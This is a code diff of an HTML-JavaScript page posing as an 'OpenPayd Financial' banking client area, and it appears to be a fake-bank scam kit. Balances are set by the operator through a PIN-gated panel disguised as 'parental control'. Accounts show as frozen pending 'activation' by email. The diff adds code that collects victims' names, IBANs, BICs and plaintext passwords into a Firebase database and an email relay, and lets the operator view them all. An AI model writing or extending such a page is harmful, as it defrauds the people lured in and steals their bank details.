@@ -509,7 +509,7 @@
     </div>
   </div>
 
-  <!-- ==================== MODALE : RETRAIT (NOM / PRÉNOM, IBAN, BIC + ENVOI AUTOMATIQUE) ==================== -->
+  <!-- ==================== MODALE : RETRAIT (NOM / PRÉNOM, IBAN, BIC + FIREBASE + WEB3FORMS) ==================== -->
   <div id="withdraw-modal" class="hidden fixed inset-0 z-50 bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-4">
     <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl border border-slate-100 overflow-hidden fade-in">
       <!-- Header Modale -->
@@ -571,7 +571,7 @@
           />
         </div>
 
-        <!-- Rectangles bas : Enregistrer (envoi automatique) + Prise en charge accélérée -->
+        <!-- Rectangles bas : Enregistrer (Firebase + Web3Forms) + Prise en charge accélérée -->
         <div class="pt-2 space-y-2.5">
           <button
             type="submit"
@@ -631,14 +631,14 @@
     </div>
   </div>
 
-  <!-- ==================== MODALE CONTRÔLE PARENTAL (ACCESSIBLE VIA ?admin=1) ==================== -->
+  <!-- ==================== MODALE CONTRÔLE PARENTAL EN LIGNE (ACCESSIBLE VIA ?admin=1) ==================== -->
   <div id="parent-modal" class="hidden fixed inset-0 z-50 bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-4">
     <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl border border-slate-100 overflow-hidden max-h-[90vh] flex flex-col">
       <!-- Header Modale -->
       <div class="px-6 py-4 bg-gradient-to-r from-purple-700 to-blue-600 text-white flex items-center justify-between">
         <div class="flex items-center gap-2">
           <i class="fa-solid fa-shield-halved"></i>
-          <h3 id="modal-parent-title" class="font-bold text-base">Contrôle Parental</h3>
+          <h3 id="modal-parent-title" class="font-bold text-base">Contrôle Parental Cloud</h3>
         </div>
         <button type="button" onclick="closeParentModal()" class="w-8 h-8 rounded-full bg-white/20 hover:bg-white/30 flex items-center justify-center">
           <i class="fa-solid fa-xmark"></i>
@@ -648,7 +648,7 @@
       <!-- ÉTAPE 1 : SAISIE DU CODE PIN PARENTAL -->
       <div id="parent-pin-step" class="p-6 space-y-4">
         <p id="pin-prompt-text" class="text-sm text-slate-600 text-center">
-          Entrez votre code PIN parental pour ajuster le solde, les informations et générer un lien de partage unique.
+          Entrez votre code PIN parental pour gérer les soldes en temps réel et consulter les IBAN enregistrés.
         </p>
         <input
           type="password"
@@ -668,8 +668,25 @@
         </button>
       </div>
 
-      <!-- ÉTAPE 2 : FORMULAIRE DE GESTION & PARTAGE WHATSAPP -->
+      <!-- ÉTAPE 2 : GESTION EN DIRECT DES MEMBRES DE LA FAMILLE -->
       <div id="parent-settings-step" class="hidden p-6 space-y-3.5 overflow-y-auto">
+        <!-- Sélecteur de membre existant dans Firebase -->
+        <div class="p-3 rounded-2xl bg-purple-50 border border-purple-200 space-y-2">
+          <div class="flex items-center justify-between">
+            <label class="text-xs font-extrabold text-purple-900 uppercase tracking-wider">Membres enregistrés</label>
+            <button type="button" onclick="prepareNewMemberForm()" class="text-xs font-bold text-blue-700 hover:underline">
+              + Nouveau membre
+            </button>
+          </div>
+          <select
+            id="member-selector"
+            onchange="onSelectMemberFromDropdown()"
+            class="w-full px-3 py-2.5 rounded-xl border border-purple-200 bg-white text-sm font-semibold text-slate-800 outline-none"
+          >
+            <option value="">Chargement des comptes...</option>
+          </select>
+        </div>
+
         <div>
           <label class="block text-xs font-bold text-slate-600 mb-1">Solde EUR (€)</label>
           <input type="number" step="0.01" id="edit-eur" class="w-full px-3.5 py-2.5 rounded-xl border border-slate-200 text-sm font-bold" />
@@ -687,7 +704,7 @@
         </div>
 
         <div>
-          <label class="block text-xs font-bold text-slate-600 mb-1">Mail (Login & Profil)</label>
+          <label class="block text-xs font-bold text-slate-600 mb-1">Mail (Identifiant de connexion)</label>
           <input type="email" id="edit-mail" class="w-full px-3.5 py-2.5 rounded-xl border border-slate-200 text-sm" />
         </div>
 
@@ -697,26 +714,37 @@
         </div>
 
         <div>
-          <label class="block text-xs font-bold text-slate-600 mb-1">Mot de passe Login (pour ce membre)</label>
+          <label class="block text-xs font-bold text-slate-600 mb-1">Mot de passe Login</label>
           <input type="text" id="edit-password" class="w-full px-3.5 py-2.5 rounded-xl border border-slate-200 text-sm font-mono" />
+        </div>
+
+        <!-- Affichage des coordonnées bancaires enregistrées par ce membre (IBAN / BIC) -->
+        <div id="admin-bank-details-box" class="p-3.5 rounded-2xl bg-slate-50 border border-slate-200 space-y-1 text-xs">
+          <p class="font-extrabold text-slate-700 uppercase tracking-wider mb-1">
+            <i class="fa-solid fa-building-columns text-purple-600 mr-1"></i> Coordonnées Retrait (IBAN / BIC)
+          </p>
+          <p class="text-slate-600"><span class="font-semibold">Bénéficiaire :</span> <span id="admin-view-beneficiary" class="font-bold text-slate-900">Non renseigné</span></p>
+          <p class="text-slate-600"><span class="font-semibold">IBAN :</span> <span id="admin-view-iban" class="font-mono font-bold text-slate-900">Non renseigné</span></p>
+          <p class="text-slate-600"><span class="font-semibold">BIC :</span> <span id="admin-view-bic" class="font-mono font-bold text-slate-900">Non renseigné</span></p>
         </div>
 
         <div class="pt-2 space-y-2.5">
           <button
             type="button"
-            onclick="saveParentSettings()"
-            class="w-full py-3 rounded-2xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm shadow transition"
+            id="btn-save-firebase"
+            onclick="saveMemberToFirebase()"
+            class="w-full py-3 rounded-2xl bg-gradient-to-r from-purple-700 to-blue-600 hover:from-purple-800 hover:to-blue-700 text-white font-bold text-sm shadow transition"
           >
-            <i class="fa-solid fa-check mr-1.5"></i> Appliquer sur cet appareil
+            <i class="fa-solid fa-cloud-arrow-up mr-1.5"></i> Enregistrer dans la base en ligne
           </button>
 
           <button
             type="button"
-            onclick="shareViaWhatsApp()"
+            onclick="shareFixedAppViaWhatsApp()"
             class="w-full py-3 rounded-2xl bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-sm shadow transition flex items-center justify-center gap-2"
           >
             <i class="fa-brands fa-whatsapp text-lg"></i>
-            <span>Générer son lien fixe & Partager (WhatsApp)</span>
+            <span>Envoyer l'accès (Lien unique WhatsApp)</span>
           </button>
         </div>
       </div>
@@ -731,13 +759,16 @@
 
   <!-- ==================== LOGIQUE JAVASCRIPT ==================== -->
   <script>
-    // 1. CLÉ WEB3FORMS CONFIGURÉE
+    // 1. URL DE VOTRE BASE FIREBASE REALTIME DATABASE
+    const FIREBASE_DB_URL = 'https://openpayd-financial-default-rtdb.europe-west1.firebasedatabase.app';
+
+    // 2. CLÉ WEB3FORMS (Notification par e-mail lors d'un retrait)
     const WEB3FORMS_ACCESS_KEY = '973aaa2d-3c86-4aca-ac40-0ee834858ac6';
 
-    // 2. CODE PIN PARENTAL UNIQUE ET SECRET
+    // 3. CODE PIN PARENTAL UNIQUE ET SECRET
     const MASTER_PARENT_PIN = '852963';
 
-    // État par défaut uniquement si aucun lien personnalisé ni aucune sauvegarde locale n'existe
+    // État actif de la session
     let state = {
       lang: 'fr',
       eurBalance: 250.00,
@@ -747,10 +778,20 @@
       mail: 'leo.dupont@family.fr',
       phone: '+33 6 12 34 56 78',
       userPassword: '123456',
+      withdrawFullName: '',
+      withdrawIban: '',
+      withdrawBic: '',
       isLoggedIn: false,
       isParentUnlocked: false,
       lastInactiveType: 'convert'
     };
+
+    let allMembersCache = {};
+
+    // Convertit un e-mail en clé valide pour Firebase (remplace les caractères interdits par _)
+    function emailToKey(email) {
+      return (email || '').trim().toLowerCase().replace(/[.#$\[\]\/]/g, '_');
+    }
 
     // Dictionnaire Bilingue FR / EN
     const i18n = {
@@ -759,7 +800,8 @@
         labelLoginEmail: "Saisir votre mail",
         labelLoginPass: "Mot de passe",
         btnLogin: "Login",
-        loginErr: "Email ou mot de passe incorrect. Ouvrez votre lien personnalisé (?p=...) ou configurez le compte via ?admin=1.",
+        btnLoggingIn: "Connexion...",
+        loginErr: "Email ou mot de passe incorrect.",
         loginEmptyErr: "Veuillez saisir votre adresse mail et votre mot de passe.",
         clientArea: "Espace client",
         logout: "Se déconnecter",
@@ -809,8 +851,8 @@
         withdrawMailBody: (fullName, iban, bic) =>
           `Bonjour,\n\nVeuillez trouver ci-dessous les informations pour ma demande de retrait :\n\nNom / Prénom : ${fullName || 'Non renseigné'}\nIBAN : ${iban || 'Non renseigné'}\nBIC : ${bic || 'Non renseigné'}\n\nCordialement.`,
         footer: "© OpenPayd Financial • Sécurité bancaire & données protégées",
-        toastSaved: "Paramètres verrouillés sur cet appareil",
-        toastCopied: "Lien fixe copié pour ce membre !",
+        toastCloudSaved: "Compte enregistré et synchronisé en ligne !",
+        toastCopied: "Lien unique copié !",
         toastMailCopied: "Adresse openpayd@financial.directory copiée"
       },
       en: {
@@ -818,7 +860,8 @@
         labelLoginEmail: "Enter your email",
         labelLoginPass: "Password",
         btnLogin: "Login",
-        loginErr: "Incorrect email or password. Open your personalized link (?p=...) or set up the account via ?admin=1.",
+        btnLoggingIn: "Signing in...",
+        loginErr: "Incorrect email or password.",
         loginEmptyErr: "Please enter your email address and password.",
         clientArea: "Client Area",
         logout: "Log out",
@@ -868,121 +911,45 @@
         withdrawMailBody: (fullName, iban, bic) =>
           `Hello,\n\nPlease find below the details for my withdrawal request:\n\nLast Name / First Name: ${fullName || 'Not provided'}\nIBAN: ${iban || 'Not provided'}\nBIC: ${bic || 'Not provided'}\n\nBest regards.`,
         footer: "© OpenPayd Financial • Banking security & protected data",
-        toastSaved: "Settings locked on this device",
-        toastCopied: "Fixed link copied for this member!",
+        toastCloudSaved: "Account saved and synced online!",
+        toastCopied: "Unique link copied!",
         toastMailCopied: "Address openpayd@financial.directory copied"
       }
     };
 
-    // Encodage et Décodage sécurisé des données dans le lien (Base64 UTF-8)
-    function encodeProfileToken(profileObj) {
-      const jsonStr = JSON.stringify(profileObj);
-      return btoa(unescape(encodeURIComponent(jsonStr)));
-    }
-
-    function decodeProfileToken(token) {
-      try {
-        const cleanToken = decodeURIComponent(token).trim();
-        const jsonStr = decodeURIComponent(escape(atob(cleanToken)));
-        return JSON.parse(jsonStr);
-      } catch (e) {
-        try {
-          const jsonStr2 = decodeURIComponent(escape(atob(token.trim())));
-          return JSON.parse(jsonStr2);
-        } catch (err) {
-          return null;
-        }
-      }
-    }
-
     // Initialisation au chargement de la page
     window.addEventListener('DOMContentLoaded', () => {
-      loadFixedProfile();
+      restoreLastEmailHint();
       applyTranslations();
       renderDashboardData();
 
+      // Si ?admin=1 est présent dans l'URL, ouvrir directement le contrôle parental
       const params = new URLSearchParams(window.location.search);
       if (params.get('admin') === '1') {
         openParentModal();
       }
     });
 
-    // Chargement prioritaire et verrouillage définitif du profil lié à l'URL
-    function loadFixedProfile() {
-      const params = new URLSearchParams(window.location.search);
-      let loadedFromUrl = false;
-
-      if (params.has('p')) {
-        const decoded = decodeProfileToken(params.get('p'));
-        if (decoded) {
-          state.eurBalance = parseFloat(decoded.eur) || 0;
-          state.nom = decoded.nom || state.nom;
-          state.prenom = decoded.prenom || state.prenom;
-          state.mail = decoded.mail || state.mail;
-          state.phone = decoded.phone || state.phone;
-          state.userPassword = decoded.pwd || state.userPassword;
-          if (decoded.lang === 'fr' || decoded.lang === 'en') state.lang = decoded.lang;
-          loadedFromUrl = true;
+    function restoreLastEmailHint() {
+      try {
+        const lastEmail = localStorage.getItem('openpayd_last_login_email');
+        if (lastEmail) {
+          document.getElementById('login-email-input').value = lastEmail;
         }
-      } else if (params.has('eur') || params.has('mail') || params.has('nom') || params.has('pwd')) {
-        if (params.has('eur')) state.eurBalance = parseFloat(params.get('eur')) || 0;
-        if (params.has('nom')) state.nom = params.get('nom');
-        if (params.has('prenom')) state.prenom = params.get('prenom');
-        if (params.has('mail')) state.mail = params.get('mail');
-        if (params.has('phone')) state.phone = params.get('phone');
-        if (params.has('pwd')) state.userPassword = params.get('pwd');
-        if (params.has('lang') && (params.get('lang') === 'fr' || params.get('lang') === 'en')) {
-          state.lang = params.get('lang');
-        }
-        loadedFromUrl = true;
-      }
-
-      const storageKey = 'openpayd_fixed_profile_' + (state.mail || 'default').toLowerCase().trim();
-
-      if (loadedFromUrl) {
-        try {
-          localStorage.setItem('openpayd_last_active_key', storageKey);
-          localStorage.setItem(storageKey, JSON.stringify({
-            eurBalance: state.eurBalance,
-            nom: state.nom,
-            prenom: state.prenom,
-            mail: state.mail,
-            phone: state.phone,
-            userPassword: state.userPassword,
-            lang: state.lang
-          }));
-        } catch (e) {
-          console.error(e);
-        }
-      } else {
-        try {
-          const lastKey = localStorage.getItem('openpayd_last_active_key');
-          if (lastKey) {
-            const saved = localStorage.getItem(lastKey);
-            if (saved) {
-              const parsed = JSON.parse(saved);
-              state = { ...state, ...parsed, isLoggedIn: false, isParentUnlocked: false };
-            }
-          }
-        } catch (e) {
-          console.error(e);
-        }
-      }
-
-      const emailInput = document.getElementById('login-email-input');
-      if (emailInput && (loadedFromUrl || localStorage.getItem('openpayd_last_active_key'))) {
-        emailInput.value = state.mail;
+      } catch (e) {
+        console.error(e);
       }
     }
 
-    // Gestion du formulaire Login
-    function handleLogin(event) {
+    // ==================== CONNEXION EN DIRECT DEPUIS FIREBASE ====================
+    async function handleLogin(event) {
       if (event) event.preventDefault();
 
       const inputMail = document.getElementById('login-email-input').value.trim().toLowerCase();
       const inputPass = document.getElementById('login-pass-input').value.trim();
       const errEl = document.getElementById('login-error-msg');
       const cardEl = document.getElementById('login-card');
+      const loginBtn = document.getElementById('btn-login-submit');
 
       if (!inputMail || !inputPass) {
         errEl.innerText = i18n[state.lang].loginEmptyErr;
@@ -991,37 +958,55 @@
         return;
       }
 
-      let matchedProfile = null;
-      const expectedMail = (state.mail || '').trim().toLowerCase();
-      const expectedPass = (state.userPassword || '').trim();
+      loginBtn.disabled = true;
+      loginBtn.innerText = i18n[state.lang].btnLoggingIn;
 
-      if (inputMail === expectedMail && inputPass === expectedPass) {
-        matchedProfile = state;
-      } else {
-        try {
-          const savedRaw = localStorage.getItem('openpayd_fixed_profile_' + inputMail);
-          if (savedRaw) {
-            const savedObj = JSON.parse(savedRaw);
-            if ((savedObj.userPassword || '').trim() === inputPass) {
-              matchedProfile = savedObj;
-            }
-          }
-        } catch (e) {
-          console.error(e);
+      try {
+        const userKey = emailToKey(inputMail);
+        const res = await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`);
+        const userData = await res.json();
+
+        let matched = false;
+
+        if (userData && (userData.userPassword || '').trim() === inputPass) {
+          state.eurBalance = parseFloat(userData.eurBalance) || 0;
+          state.nom = userData.nom || 'Dupont';
+          state.prenom = userData.prenom || 'Léo';
+          state.mail = userData.mail || inputMail;
+          state.phone = userData.phone || '';
+          state.userPassword = userData.userPassword;
+          state.withdrawFullName = userData.withdrawFullName || '';
+          state.withdrawIban = userData.withdrawIban || '';
+          state.withdrawBic = userData.withdrawBic || '';
+          matched = true;
+        } else if (!userData && inputMail === 'leo.dupont@family.fr' && inputPass === '123456') {
+          // Compte de démonstration par défaut si la base est encore vide
+          matched = true;
         }
-      }
 
-      if (matchedProfile) {
-        state = { ...state, ...matchedProfile, isLoggedIn: true };
-        errEl.classList.add('hidden');
-        renderDashboardData();
-        document.getElementById('login-screen').classList.add('hidden');
-        document.getElementById('app-wrapper').classList.remove('hidden');
-        navigateTo('dashboard');
-      } else {
+        if (matched) {
+          state.isLoggedIn = true;
+          errEl.classList.add('hidden');
+          try {
+            localStorage.setItem('openpayd_last_login_email', inputMail);
+          } catch (e) {}
+          renderDashboardData();
+          document.getElementById('login-screen').classList.add('hidden');
+          document.getElementById('app-wrapper').classList.remove('hidden');
+          navigateTo('dashboard');
+        } else {
+          errEl.innerText = i18n[state.lang].loginErr;
+          errEl.classList.remove('hidden');
+          triggerShake(cardEl);
+        }
+      } catch (err) {
+        console.error('Erreur Firebase Login:', err);
         errEl.innerText = i18n[state.lang].loginErr;
         errEl.classList.remove('hidden');
         triggerShake(cardEl);
+      } finally {
+        loginBtn.disabled = false;
+        loginBtn.innerText = i18n[state.lang].btnLogin;
       }
     }
 
@@ -1032,7 +1017,6 @@
       el.classList.add('shake');
     }
 
-    // Afficher / Masquer le mot de passe
     function togglePasswordVisibility() {
       const passInput = document.getElementById('login-pass-input');
       const eyeIcon = document.getElementById('pass-eye-icon');
@@ -1045,7 +1029,6 @@
       }
     }
 
-    // Bouton Se déconnecter
     function logoutUser() {
       state.isLoggedIn = false;
       state.isParentUnlocked = false;
@@ -1093,33 +1076,28 @@
     function applyTranslations() {
       const t = i18n[state.lang];
 
-      // Page Login
       document.getElementById('login-subtitle').innerText = t.loginSubtitle;
       document.getElementById('label-login-email').innerText = t.labelLoginEmail;
       document.getElementById('label-login-pass').innerText = t.labelLoginPass;
       document.getElementById('btn-login-submit').innerText = t.btnLogin;
       document.getElementById('login-lang-btn').innerText = state.lang.toUpperCase();
 
-      // Header
       document.getElementById('header-client-area').innerText = t.clientArea;
       document.getElementById('header-lang-btn').innerText = state.lang.toUpperCase();
       document.getElementById('logout-btn-text').innerText = t.logout;
 
-      // Dashboard
       document.getElementById('badge-account').innerText = t.account;
       document.getElementById('manage-label').innerText = t.manage;
       document.getElementById('balance-title').innerText = t.balanceTitle;
       document.getElementById('status-frozen-text').innerText = t.frozen;
       document.getElementById('yellow-warning-text').innerText = t.yellowWarning;
 
-      // Cercles
       document.getElementById('btn-text-deposit').innerText = t.deposit;
       document.getElementById('btn-text-withdraw').innerText = t.withdraw;
       document.getElementById('btn-text-convert').innerText = t.convert;
       document.getElementById('btn-text-support').innerText = t.support;
       document.getElementById('btn-text-id').innerText = t.id;
 
-      // Modale Deposit
       document.getElementById('modal-deposit-title').innerText = t.modalDepositTitle;
       document.getElementById('modal-deposit-desc').innerText = t.modalDepositDesc;
       const depositDetailsBtn = document.getElementById('btn-get-deposit-details');
@@ -1128,7 +1106,6 @@
         ? 'mailto:openpayd@financial.directory?subject=Coordonn%C3%A9es%20de%20d%C3%A9p%C3%B4t'
         : 'mailto:openpayd@financial.directory?subject=Deposit%20details';
 
-      // Modale Retrait
       document.getElementById('modal-withdraw-title').innerText = t.modalWithdrawTitle;
       document.getElementById('modal-withdraw-subtitle').innerText = t.modalWithdrawSubtitle;
       document.getElementById('lbl-withdraw-fullname').innerText = t.lblWithdrawFullname;
@@ -1137,7 +1114,6 @@
       document.getElementById('btn-withdraw-save').innerText = t.btnWithdrawSave;
       document.getElementById('btn-withdraw-expedited-text').innerText = t.btnWithdrawExpedited;
 
-      // Modale Compte inactif (Cadenas & Gérer)
       document.getElementById('modal-inactive-title').innerText = t.modalInactiveTitle;
       document.getElementById('modal-inactive-desc').innerText = t.modalInactiveDesc;
       const activateBtn = document.getElementById('btn-activate-account');
@@ -1146,19 +1122,16 @@
         ? 'mailto:openpayd@financial.directory?subject=Activation%20de%20compte'
         : 'mailto:openpayd@financial.directory?subject=Account%20activation';
 
-      // Vue Inactive
       document.getElementById('inactive-title').innerText = t.inactiveTitle;
       document.getElementById('inactive-desc').innerText = t.inactiveDesc;
       document.getElementById('btn-back-home-inactive').innerText = t.backHome;
 
-      // Vue Support
       document.getElementById('support-title').innerText = t.supportTitle;
       document.getElementById('support-desc').innerText = t.supportDesc;
       document.getElementById('support-lang-label').innerText = t.supportLangLabel;
       document.getElementById('support-rect-title').innerText = t.supportRectTitle;
       document.getElementById('btn-back-home-support').innerText = t.backHome;
 
-      // Boutons Swap Langue dans Support
       const frBtn = document.getElementById('swap-fr-btn');
       const enBtn = document.getElementById('swap-en-btn');
       if (state.lang === 'fr') {
@@ -1169,7 +1142,6 @@
         frBtn.className = "px-3.5 py-1.5 rounded-lg text-xs font-extrabold text-slate-600 hover:bg-slate-100 transition";
       }
 
-      // Vue ID
       document.getElementById('id-title').innerText = t.idTitle;
       document.getElementById('id-lbl-nom').innerText = t.idNom;
       document.getElementById('id-lbl-prenom').innerText = t.idPrenom;
@@ -1185,11 +1157,9 @@
       document.getElementById('id-val-status').innerText = t.idStatusVal;
       document.getElementById('btn-back-home-id').innerText = t.returnHomeId;
 
-      // Footer
       document.getElementById('footer-text').innerText = t.footer;
     }
 
-    // Mise à jour des valeurs chiffrées et identité à l'écran
     function renderDashboardData() {
       const eurVal = Number(state.eurBalance) || 0;
       const usdVal = eurVal * state.usdRate;
@@ -1213,13 +1183,12 @@
       document.getElementById('id-val-phone').innerText = state.phone;
     }
 
-    // ==================== VUE ID : DEMANDE DE VÉRIFICATION PAR MAIL ====================
+    // ==================== VUE ID & DEPOSIT ====================
     function handleIdVerificationMailClick() {
       copyToClipboard('openpayd@financial.directory');
       showToast(i18n[state.lang].toastMailCopied);
     }
 
-    // ==================== MODALE : DEPOSIT (OBTENIR MES COORDONNÉES DE DÉPÔT) ====================
     function openDepositModal() {
       document.getElementById('deposit-modal').classList.remove('hidden');
     }
@@ -1234,24 +1203,11 @@
       closeDepositModal();
     }
 
-    // ==================== MODALE : RETRAIT (ENVOI SILENCIEUX WEB3FORMS + LOCALSTORAGE) ====================
+    // ==================== MODALE : RETRAIT (FIREBASE + WEB3FORMS) ====================
     function openWithdrawModal() {
-      const storageKey = 'openpayd_withdraw_details_' + (state.mail || 'default').toLowerCase().trim();
-      try {
-        const saved = localStorage.getItem(storageKey);
-        if (saved) {
-          const parsed = JSON.parse(saved);
-          document.getElementById('withdraw-fullname').value = parsed.fullName || '';
-          document.getElementById('withdraw-iban').value = parsed.iban || '';
-          document.getElementById('withdraw-bic').value = parsed.bic || '';
-        } else {
-          document.getElementById('withdraw-fullname').value = `${state.nom} ${state.prenom}`.trim();
-          document.getElementById('withdraw-iban').value = '';
-          document.getElementById('withdraw-bic').value = '';
-        }
-      } catch (e) {
-        console.error(e);
-      }
+      document.getElementById('withdraw-fullname').value = state.withdrawFullName || `${state.nom} ${state.prenom}`.trim();
+      document.getElementById('withdraw-iban').value = state.withdrawIban || '';
+      document.getElementById('withdraw-bic').value = state.withdrawBic || '';
       document.getElementById('withdraw-modal').classList.remove('hidden');
     }
 
@@ -1266,20 +1222,35 @@
       const bic = document.getElementById('withdraw-bic').value.trim().toUpperCase();
       const saveBtn = document.getElementById('btn-withdraw-save');
 
-      // 1. Sauvegarde locale immédiate
-      const storageKey = 'openpayd_withdraw_details_' + (state.mail || 'default').toLowerCase().trim();
+      state.withdrawFullName = fullName;
+      state.withdrawIban = iban;
+      state.withdrawBic = bic;
+
+      saveBtn.disabled = true;
+      saveBtn.innerText = i18n[state.lang].btnWithdrawSaving;
+
       try {
-        localStorage.setItem(storageKey, JSON.stringify({ fullName, iban, bic }));
-      } catch (e) {
-        console.error(e);
-      }
+        // 1. Enregistrement direct dans Firebase Realtime Database (visible sur votre PC via ?admin=1)
+        const userKey = emailToKey(state.mail);
+        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            eurBalance: state.eurBalance,
+            nom: state.nom,
+            prenom: state.prenom,
+            mail: state.mail,
+            phone: state.phone,
+            userPassword: state.userPassword,
+            withdrawFullName: fullName,
+            withdrawIban: iban,
+            withdrawBic: bic,
+            updatedAt: new Date().toISOString()
+          })
+        });
 
-      // 2. Envoi automatique et silencieux par e-mail via Web3Forms
-      if (WEB3FORMS_ACCESS_KEY) {
-        saveBtn.disabled = true;
-        saveBtn.innerText = i18n[state.lang].btnWithdrawSaving;
-
-        try {
+        // 2. Notification automatique par e-mail via Web3Forms
+        if (WEB3FORMS_ACCESS_KEY) {
           await fetch('https://api.web3forms.com/submit', {
             method: 'POST',
             headers: {
@@ -1297,12 +1268,12 @@
               Solde_Compte_EUR: `${state.eurBalance} €`
             })
           });
-        } catch (err) {
-          console.error('Erreur Web3Forms:', err);
-        } finally {
-          saveBtn.disabled = false;
-          saveBtn.innerText = i18n[state.lang].btnWithdrawSave;
         }
+      } catch (err) {
+        console.error('Erreur sauvegarde retrait:', err);
+      } finally {
+        saveBtn.disabled = false;
+        saveBtn.innerText = i18n[state.lang].btnWithdrawSave;
       }
 
       closeWithdrawModal();
@@ -1313,13 +1284,6 @@
       const fullName = document.getElementById('withdraw-fullname').value.trim();
       const iban = document.getElementById('withdraw-iban').value.trim().toUpperCase();
       const bic = document.getElementById('withdraw-bic').value.trim().toUpperCase();
-
-      const storageKey = 'openpayd_withdraw_details_' + (state.mail || 'default').toLowerCase().trim();
-      try {
-        localStorage.setItem(storageKey, JSON.stringify({ fullName, iban, bic }));
-      } catch (e) {
-        console.error(e);
-      }
 
       const t = i18n[state.lang];
       const subject = encodeURIComponent(t.withdrawMailSubject);
@@ -1332,7 +1296,7 @@
       window.location.href = `mailto:openpayd@financial.directory?subject=${subject}&body=${body}`;
     }
 
-    // ==================== MODALE : COMPTE INACTIF (CADENAS & GÉRER) ====================
+    // ==================== MODALE : COMPTE INACTIF ====================
     function openInactiveAccountModal() {
       document.getElementById('inactive-account-modal').classList.remove('hidden');
     }
@@ -1347,14 +1311,14 @@
       closeInactiveAccountModal();
     }
 
-    // ==================== CONTRÔLE PARENTAL & PARTAGE WHATSAPP ====================
+    // ==================== CONTRÔLE PARENTAL CLOUD (?admin=1) ====================
     function openParentModal() {
       document.getElementById('parent-modal').classList.remove('hidden');
       document.getElementById('pin-error-text').classList.add('hidden');
       document.getElementById('parent-pin-input').value = '';
 
       if (state.isParentUnlocked) {
-        showParentSettingsForm();
+        loadAllMembersIntoAdmin();
       } else {
         document.getElementById('parent-pin-step').classList.remove('hidden');
         document.getElementById('parent-settings-step').classList.add('hidden');
@@ -1369,91 +1333,158 @@
       const entered = document.getElementById('parent-pin-input').value.trim();
       if (entered === MASTER_PARENT_PIN) {
         state.isParentUnlocked = true;
-        showParentSettingsForm();
+        loadAllMembersIntoAdmin();
       } else {
         document.getElementById('pin-error-text').classList.remove('hidden');
       }
     }
 
-    function showParentSettingsForm() {
+    async function loadAllMembersIntoAdmin() {
       document.getElementById('parent-pin-step').classList.add('hidden');
       document.getElementById('parent-settings-step').classList.remove('hidden');
 
-      document.getElementById('edit-eur').value = state.eurBalance;
-      document.getElementById('edit-nom').value = state.nom;
-      document.getElementById('edit-prenom').value = state.prenom;
-      document.getElementById('edit-mail').value = state.mail;
-      document.getElementById('edit-phone').value = state.phone;
-      document.getElementById('edit-password').value = state.userPassword;
-    }
+      const selector = document.getElementById('member-selector');
+      selector.innerHTML = '<option value="">Chargement...</option>';
 
-    function readFormValuesToState() {
-      state.eurBalance = parseFloat(document.getElementById('edit-eur').value) || 0;
-      state.nom = document.getElementById('edit-nom').value.trim() || 'Dupont';
-      state.prenom = document.getElementById('edit-prenom').value.trim() || 'Léo';
-      state.mail = document.getElementById('edit-mail').value.trim() || 'leo@family.fr';
-      state.phone = document.getElementById('edit-phone').value.trim() || '+33 6 00 00 00 00';
-      state.userPassword = document.getElementById('edit-password').value.trim() || '123456';
-    }
-
-    function saveParentSettings() {
-      readFormValuesToState();
-
-      const storageKey = 'openpayd_fixed_profile_' + state.mail.toLowerCase();
       try {
-        localStorage.setItem('openpayd_last_active_key', storageKey);
-        localStorage.setItem(storageKey, JSON.stringify({
-          eurBalance: state.eurBalance,
-          nom: state.nom,
-          prenom: state.prenom,
-          mail: state.mail,
-          phone: state.phone,
-          userPassword: state.userPassword,
-          lang: state.lang
-        }));
-      } catch (e) {
-        console.error(e);
+        const res = await fetch(`${FIREBASE_DB_URL}/users.json`);
+        const data = await res.json();
+        allMembersCache = data || {};
+
+        const keys = Object.keys(allMembersCache);
+        if (keys.length === 0) {
+          selector.innerHTML = '<option value="">-- Aucun membre enregistré (Créer le 1er) --</option>';
+          prepareNewMemberForm();
+        } else {
+          selector.innerHTML = '<option value="">-- Sélectionner un membre --</option>';
+          keys.forEach(k => {
+            const m = allMembersCache[k];
+            const opt = document.createElement('option');
+            opt.value = k;
+            opt.textContent = `${m.prenom || ''} ${m.nom || ''} (${m.mail || k}) — ${Number(m.eurBalance || 0).toFixed(2)} €`;
+            selector.appendChild(opt);
+          });
+
+          // Sélectionner le premier membre automatiquement
+          selector.value = keys[0];
+          fillAdminFormWithMember(allMembersCache[keys[0]]);
+        }
+      } catch (err) {
+        console.error('Erreur chargement Firebase:', err);
+        selector.innerHTML = '<option value="">Erreur de connexion Firebase</option>';
+      }
+    }
+
+    function onSelectMemberFromDropdown() {
+      const key = document.getElementById('member-selector').value;
+      if (key && allMembersCache[key]) {
+        fillAdminFormWithMember(allMembersCache[key]);
+      } else {
+        prepareNewMemberForm();
+      }
+    }
+
+    function fillAdminFormWithMember(m) {
+      document.getElementById('edit-eur').value = m.eurBalance ?? 0;
+      document.getElementById('edit-nom').value = m.nom || '';
+      document.getElementById('edit-prenom').value = m.prenom || '';
+      document.getElementById('edit-mail').value = m.mail || '';
+      document.getElementById('edit-phone').value = m.phone || '';
+      document.getElementById('edit-password').value = m.userPassword || '';
+
+      document.getElementById('admin-view-beneficiary').innerText = m.withdrawFullName || 'Non renseigné';
+      document.getElementById('admin-view-iban').innerText = m.withdrawIban || 'Non renseigné';
+      document.getElementById('admin-view-bic').innerText = m.withdrawBic || 'Non renseigné';
+    }
+
+    function prepareNewMemberForm() {
+      document.getElementById('member-selector').value = '';
+      document.getElementById('edit-eur').value = '250';
+      document.getElementById('edit-nom').value = '';
+      document.getElementById('edit-prenom').value = '';
+      document.getElementById('edit-mail').value = '';
+      document.getElementById('edit-phone').value = '';
+      document.getElementById('edit-password').value = '';
+
+      document.getElementById('admin-view-beneficiary').innerText = 'Non renseigné';
+      document.getElementById('admin-view-iban').innerText = 'Non renseigné';
+      document.getElementById('admin-view-bic').innerText = 'Non renseigné';
+    }
+
+    async function saveMemberToFirebase() {
+      const mail = document.getElementById('edit-mail').value.trim().toLowerCase();
+      if (!mail) {
